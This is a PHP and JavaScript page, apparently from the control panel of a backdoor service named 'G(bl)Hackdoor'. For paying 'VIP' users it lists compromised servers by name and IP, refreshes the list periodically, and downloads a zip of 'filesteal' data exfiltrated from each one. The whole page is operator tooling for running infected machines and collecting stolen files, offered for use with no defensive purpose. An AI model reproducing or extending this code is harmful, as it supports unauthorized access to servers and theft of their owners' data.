<?php include('isdefault.php') ?>
<?php if(!IsVIP($_SESSION['id'])){
  die("Only VIP");
} ?>

<div class="modal fade" id="dlfilesteal-modal" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        Téléchargement du filesteal. . .
      </div>
      <div class="modal-body" id="dlfilesteal-body">
        <progress class="form-control" id="progressfsniBBa" value="0" max="100"></progress>
      </div>
    </div>
  </div>
</div>
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                                <p>
                                    <div class="input-group md-form form-sm form-2 pl-0">
                                        <input class="form-control my-0 py-1 red-border" type="text" placeholder="Search" aria-label="Search" id="myInputTextField">
                                    <div class="input-group-append">
                                    </div>
                                    </div>
                                </p>
            
                                    <table id="server_lisst" class="table table-dark" style="width:100%">
        <thead> 
            <tr>
                <th>Nom du serveur</th>
                <th>IP</th>
                <th style="min-width: 40px!important;">Action</th>
            </tr>
        </thead>

        <tbody id="ilyadesserveurs">
            <?php 
           $all_fs_predata = Server::GetAllFileSteal();
$list = [];

foreach ($all_fs_predata as $data)
{    
     $button_dl = '<a onclick="dl(\'http://'.$_SERVER["HTTP_HOST"].'/beta/core/ajax/download-fs.php?ik=45133722&ip='.$data['id'].'\', \''.$data['ip'].'.zip\')" href="#" type="button" class="btn btn-success btn-sm"><i class="fas fa-download"></i></a>';
       echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['name']) . "</b></td>
                                <td><b>" . htmlspecialchars($data['ip']) . "</b></td>
                                <td><b>" . $button_dl . "</b></td>
                            </tr>
                        ";
}
            ?>
        </tbody>
    </table>
</font>

<div class="dataTables_paginate paging_simple_numbers" id="server_lisst_paginate"><ul class="pagination"><li class="paginate_button previous disabled" id="server_lisst_previous"><a href="#" style="background-color: #152036; border-color: #253454;" aria-controls="server_lisst" data-dt-idx="0" tabindex="0">Previous</a></li><li class="paginate_button next disabled" id="server_lisst_next"><a href="#" aria-controls="server_lisst" data-dt-idx="1" style="background-color: #152036; border-color: #253454;" tabindex="0">Next</a></li></ul></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php include('isdefault_down.php') ?>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script>
  $('#server_lisst').dataTable( {
    "iDisplayLength": 999999999,
    "bLengthChange": false,
    "oLanguage": {
        "sSearch": '<span>Recherche: </span>',
        "emptyTable": '<span>¯\_(ツ)_/¯ Pas de serveur ¯\_(ツ)_/¯</span>'
    }
  } );
    oTable = $('#server_lisst').DataTable();
$('#myInputTextField').keyup(function(){
      oTable.search($(this).val()).draw() ;
})
    setInterval('load_servers()', 14000);
   function load_servers() {
     $('#ilyadesserveurs').load('listed_ki_tue.php?theget=6');
   }
$.ajaxSetup({
  beforeSend:function(jqXHR,settings){
    if (settings.dataType === 'binary'){
      settings.xhr().responseType='arraybuffer';
      settings.processData=false;
    }
  }
})
function dl(file, name) {
    $("#dlfilesteal-modal").modal("show");



    var oReq = new XMLHttpRequest();
oReq.open("GET", file, true);
oReq.responseType = "blob";

oReq.onload = function(oEvent) {
  var blob = oReq.response;
  var a = document.createElement('a');
  a.download = "FileSteal_GHackDoor_" + name;
  a.href = URL.createObjectURL(blob);
  a.click();
  $("#dlfilesteal-modal").modal("hide");
};
oReq.onprogress = function (e) {
            progressfsniBBa.innerHTML = (e.loaded / e.total) * 100;
            progressfsniBBa.value = (e.loaded / e.total) * 100;
            console.log(e.loaded / e.total);
        };
oReq.send();
}
</script>
</html>

